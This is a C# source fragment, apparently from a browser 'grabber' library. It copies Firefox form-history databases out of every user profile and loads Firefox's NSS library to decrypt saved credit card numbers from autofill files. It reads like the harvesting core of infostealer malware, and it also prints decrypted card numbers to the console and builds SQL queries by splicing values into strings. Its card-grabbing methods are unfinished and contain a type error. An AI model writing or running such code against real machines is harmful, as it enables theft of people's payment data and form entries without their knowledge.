            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            if (!AnyFormHistoryExists()) throw new GrabberException(GrabberError.FormHistoryNotFound, $"No form history databases were found!"); // Throw an Exception if no form history DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!FormHistoryExists(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + FormHistoryPath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"{FormHistoryQuery} WHERE {by} = '{value}'";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            int id = reader.GetInt32(0);

                            // Get the source id which points to the source of the form data:
                            long sourceId;
                            using (var _cmd = conn.CreateCommand())
                            {
                                _cmd.CommandText = $"SELECT source_id FROM moz_history_to_sources WHERE history_id = {id}";

                                object _sId = _cmd.ExecuteScalar(); // temp
                                sourceId = _sId == null ? -1 : (long)_sId;
                            }

                            // Gets the source if it exists:
                            string source = string.Empty;
                            if (sourceId > -1) // If sourceId is -1, the form data does not have a source
                            {
                                using (var _cmd = conn.CreateCommand())
                                {
                                    _cmd.CommandText = $"SELECT source FROM moz_sources WHERE id = {sourceId}";
                                    source = _cmd.ExecuteScalar() == null ? string.Empty : (string)_cmd.ExecuteScalar();
                                }
                            }

                            formHistory.Add(new Gecko.Form()
                            {
                                Id = id,
                                Fieldname = reader.GetString(1),
                                Value = reader.GetString(2),
                                TimesUsed = reader.GetInt32(3),
                                FirstUsed = Time.FromUnixTimeMicroseconds(reader.GetInt64(4)),
                                LastUsed = Time.FromUnixTimeMicroseconds(reader.GetInt64(5)),
                                Guid = reader.GetString(6),

                                SourceId = sourceId,
                                Source = source,
                            });
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            });
            return formHistory;
        }
        
        public IEnumerable<Gecko.Form> GetFormHistory()
        {
            List<Gecko.Form> formHistory = new List<Gecko.Form>();
            if (!AnyFormHistoryExists()) throw new GrabberException(GrabberError.FormHistoryNotFound, $"No form history databases were found!"); // Throw an Exception if no form history DBs were found

            Parallel.ForEach(_profiles, (profile) =>
            {
                if (!FormHistoryExists(profile)) return;

                // Copy the database to a temporary location because it could be already in use
                string tempFile = CopyToTempFile(profile + FormHistoryPath);

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={tempFile};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = FormHistoryQuery;

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            int id = reader.GetInt32(0);

                            // Get the source id which points to the source of the form data:
                            long sourceId;
                            using (var _cmd = conn.CreateCommand())
                            {
                                _cmd.CommandText = $"SELECT source_id FROM moz_history_to_sources WHERE history_id = {id}";

                                object _sId = _cmd.ExecuteScalar(); // temp
                                sourceId = _sId == null ? -1 : (long)_sId;
                            }

                            // Gets the source if it exists:
                            string source = string.Empty;
                            if (sourceId > -1) // If sourceId is -1, the form data does not have a source
                            {
                                using (var _cmd = conn.CreateCommand())
                                {
                                    _cmd.CommandText = $"SELECT source FROM moz_sources WHERE id = {sourceId}";
                                    source = _cmd.ExecuteScalar() == null ? string.Empty : (string)_cmd.ExecuteScalar();
                                }
                            }

                            formHistory.Add(new Gecko.Form()
                            {
                                Id = id,
                                Fieldname = reader.GetString(1),
                                Value = reader.GetString(2),
                                TimesUsed = reader.GetInt32(3),
                                FirstUsed = Time.FromUnixTimeMicroseconds(reader.GetInt64(4)),
                                LastUsed = Time.FromUnixTimeMicroseconds(reader.GetInt64(5)),
                                Guid = reader.GetString(6),

                                SourceId = sourceId,
                                Source = source,
                            });
                        }
                    }
                    conn.Dispose();
                }
                File.Delete(tempFile);
            });
            return formHistory;
        }
        #endregion

        #region GetCreditCards()
        /// <summary>
        /// Converts the as parameter passed dynamic object to a list of Credit Cards
        /// </summary>
        /// <param name="ccs">dynamic json object</param>
        /// <returns>A list of Gecko Credit Cards</returns>
        private static List<Gecko.CreditCard> ConvertDynamicObjectsToCreditCards(List<object> ccs)
        {
            List<Gecko.CreditCard> _ccs = new List<Gecko.CreditCard>();
            foreach (dynamic obj in ccs)
            {
                Gecko.CreditCard.CreditCardType _cc_type = Gecko.CreditCard.CreditCardType.Unknown;
                switch (obj["cc-type"]) // Switch the credit card type:
                {
                    case "visa":
                        _cc_type = Gecko.CreditCard.CreditCardType.Visa;
                        break;
                    case "mastercard":
                        _cc_type = Gecko.CreditCard.CreditCardType.MasterCard;
                        break;
                    case "amex":
                        _cc_type = Gecko.CreditCard.CreditCardType.AmericanExpress;
                        break;
                    case "discover":
                        _cc_type = Gecko.CreditCard.CreditCardType.Discover;
                        break;
                    case "diners":
                        _cc_type = Gecko.CreditCard.CreditCardType.DinersClub;
                        break;
                    case "jcb":
                        _cc_type = Gecko.CreditCard.CreditCardType.JCB;
                        break;
                    case "mir":
                        _cc_type = Gecko.CreditCard.CreditCardType.Mir;
                        break;
                    case "unionpay":
                        _cc_type = Gecko.CreditCard.CreditCardType.UnionPay;
                        break;
                    case "cartebancaire":
                        _cc_type = Gecko.CreditCard.CreditCardType.CarteBancaire;
                        break;
                }
                string _decVal = GeckoDecryptor.DecryptValue(obj["cc-number-encrypted"]);
                Console.WriteLine($"'{_decVal}'");
                Console.WriteLine($"'{long.Parse(_decVal)}'");
                _ccs.Add(new Gecko.CreditCard
                {
                    CC_Number = obj["cc-number"],
                    CC_ExpirationMonth = (int)obj["cc-exp-month"],
                    CC_ExpirationYear = (int)obj["cc-exp-year"],
                    CC_Name = obj["cc-name"],
                    CC_Type = _cc_type,
                    Guid = obj["guid"],
                    Version = obj["version"],
                    TimeCreated = Time.FromUnixTimeMilliseconds(obj["timeCreated"]),
                    TimeLastModified = Time.FromUnixTimeMilliseconds(obj["timeLastModified"]),
                    TimeLastUsed = Time.FromUnixTimeMilliseconds(obj["timeLastUsed"]),
                    TimesUsed = (int)obj["timesUsed"],
                    CC_GivenName = obj["cc-given-name"],
                    CC_AdditionalName = obj["cc-additional-name"],
                    CC_FamilyName = obj["cc-family-name"],
                    CC_Expiry = obj["cc-exp"],
                    CC_NumberEncrypted = obj["cc-number-encrypted"],
                    CC_NumberDecrypted = long.Parse(_decVal),
                });
            }
            return _ccs;
        }

        public IEnumerable<Gecko.CreditCard> GetCreditCardsBy(Gecko.CreditCard.Header by, object value)
        {
            throw new NotImplementedException();
            List<Gecko.CreditCard> creditCards = new List<Gecko.CreditCard>();
            if (value == null) throw new ArgumentNullException("value"); // throw a ArgumentNullException if value was not defined
            if (!AnyAutoFillProfilesExists()) throw new GrabberException(GrabberError.CreditCardsNotFound, $"No credit card databases were found!"); // Throw an Exception if no credit card DBs were found

            // Get ProgramFiles Path:
            string programFiles = Environment.GetEnvironmentVariable("ProgramW6432");
            if (string.IsNullOrEmpty(programFiles))
                programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

            // Load NSS:
            if (!GeckoDecryptor.LoadNSS(programFiles + @"\Mozilla Firefox")) throw new GrabberException(GrabberError.Nss3NotFound, "NSS3 couldn't be loaded!"); // throw an exception if NSS3 couldn't be loaded

            foreach (string profile in Profiles)
            {
                if (!AutoFillProfilesExists(profile)) continue;

                if (!GeckoDecryptor.SetProfile(profile)) throw new GrabberException(GrabberError.CouldNotSetProfile, $"Profile could not be set: {profile}"); // throw an Exception if the firefox profile couldn't be set

                dynamic json = JSON_Serializer.Deserialize(File.ReadAllText(profile + AutoFillProfilesPath), typeof(object));
                foreach (Gecko.CreditCard cc in ConvertDynamicObjectsToCreditCards(json.creditCards))
                {
                    switch (by)
                    {
                        case Gecko.CreditCard.Header.cc_number:
                            if (cc.CC_Number == (string)value) creditCards.Add(cc);
                            break;
                        case Gecko.CreditCard.Header.cc_exp_month:
                            if (cc.CC_ExpirationMonth == (int)value) creditCards.Add(cc);
                            break;
                        case Gecko.CreditCard.Header.cc_exp_year:
                            if (cc.CC_ExpirationYear == (int)value) creditCards.Add(cc);
                            break;
                        case Gecko.CreditCard.Header.cc_name:
                            if (cc.CC_Name == (string)value) creditCards.Add(cc);
                            break;
                        case Gecko.CreditCard.Header.cc_type:
                            if (cc.CC_Type == (Gecko.CreditCard.CreditCardType)value) creditCards.Add(cc);
                            break;
                        case Gecko.CreditCard.Header.guid:
                            if (cc.Guid == (string)value) creditCards.Add(cc);
                            break;
                        case Gecko.CreditCard.Header.version:
                            if (cc.Version == (int)value) creditCards.Add(cc);
                            break;
                        case Gecko.CreditCard.Header.timeCreated:
                            if (cc.TimeCreated == (DateTime)value) creditCards.Add(cc);
                            break;
                        case Gecko.CreditCard.Header.timeLastModified:
                            if (cc.TimeLastModified == (DateTime)value) creditCards.Add(cc);
                            break;
                        case Gecko.CreditCard.Header.timeLastUsed:
                            if (cc.TimeLastUsed == (DateTime)value) creditCards.Add(cc);
                            break;
                        case Gecko.CreditCard.Header.timesUsed:
                            if (cc.TimesUsed == (uint)value) creditCards.Add(cc);
                            break;
                        case Gecko.CreditCard.Header.cc_given_name:
                            if (cc.CC_GivenName == (string)value) creditCards.Add(cc);
                            break;
                        case Gecko.CreditCard.Header.cc_additional_name:
                            if (cc.CC_AdditionalName == (string)value) creditCards.Add(cc);
                            break;
                        case Gecko.CreditCard.Header.cc_family_name:
                            if (cc.CC_FamilyName == (string)value) creditCards.Add(cc);
                            break;
                        case Gecko.CreditCard.Header.cc_number_encrypted:
                            if (cc.CC_NumberEncrypted == (string)value) creditCards.Add(cc);
                            break;
                    }
                }
            }
            GeckoDecryptor.UnLoadNSS(); // Unload NSS
            return creditCards;
        }

        public IEnumerable<Gecko.CreditCard> GetCreditCards()
        {
            throw new NotImplementedException();
            List<Gecko.CreditCard> creditCards = new List<Gecko.CreditCard>();
            if (!AnyAutoFillProfilesExists()) throw new GrabberException(GrabberError.CreditCardsNotFound, $"No credit card databases were found!"); // Throw an Exception if no credit card DBs were found

            // Get ProgramFiles Path:
            string programFiles = Environment.GetEnvironmentVariable("ProgramW6432");
            if (string.IsNullOrEmpty(programFiles))
                programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

            // Load NSS:
            if (!GeckoDecryptor.LoadNSS(programFiles + @"\Mozilla Firefox")) throw new GrabberException(GrabberError.Nss3NotFound, "NSS3 couldn't be loaded!"); // throw an exception if NSS3 couldn't be loaded

            foreach (string profile in Profiles)
            {
                if (!AutoFillProfilesExists(profile)) continue;

                if (!GeckoDecryptor.SetProfile(profile)) throw new GrabberException(GrabberError.CouldNotSetProfile, $"Profile could not be set: {profile}"); // throw an Exception if the firefox profile couldn't be set

                dynamic json = JSON_Serializer.Deserialize(File.ReadAllText(profile + AutoFillProfilesPath), typeof(object));

                creditCards.Add(ConvertDynamicObjectsToCreditCards(json.creditCards)); // Add ccs
            }
            GeckoDecryptor.UnLoadNSS(); // Unload NSS
            return creditCards;
        }
        #endregion
    }
}
